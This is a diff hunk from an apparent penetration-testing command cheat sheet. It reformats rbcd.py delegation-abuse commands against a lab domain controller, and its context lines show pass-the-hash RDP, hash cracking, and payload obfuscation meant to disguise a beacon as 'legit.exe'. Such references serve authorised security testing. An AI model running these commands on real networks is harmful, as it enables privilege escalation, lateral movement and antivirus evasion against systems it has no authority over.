@@ -202,9 +202,9 @@ nmap --script broadcast-dhcp-discover
 SimplyEmail -all -e cybersyndicates.com
 ssh-keygen -t rsa -b 4096 -f keyname
 hashcat --username --hash-type 0 --attack-mode 0 MD5_hashes.txt `fzf-wordlists`
-rbcd.py t-delegate-to 'sv01$' -dc-ip dc01 -action read 'BREAKING\anonymous:anonymous'
-rbcd.py -delegate-from shutdown -delegate-to 'sv01$' -dc-ip dc01 -action write 'BREAKING\anonymous:anonymous'
-rbcd.py -delegate-from shutdown -delegate-to 'sv01$' -dc-ip dc01 -action remove 'BREAKING\anonymous:anonymous'
+rbcd.py t-delegate-to 'sv01$' -dc-ip dc01 -action read 'BREAKING/anonymous:anonymous'
+rbcd.py -delegate-from 'shutdown' -delegate-to 'sv01$' -dc-ip dc01 -action write 'BREAKING/anonymous:anonymous'
+rbcd.py -delegate-from 'shutdown' -delegate-to 'sv01$' -dc-ip dc01 -action remove 'BREAKING/anonymous:anonymous'
 xfreerdp /d:BREAKING.BAD /u:someuser /pth:c1c635aa12ae60b7fe39e28456a7bac6 /v:SV01.BREAKING.BAD /cert-ignore
 darkarmour -f /data/beacon.exe --encrypt xor --jmp --loop 7 -o /data/legit.exe
 amber -f beacon.exe
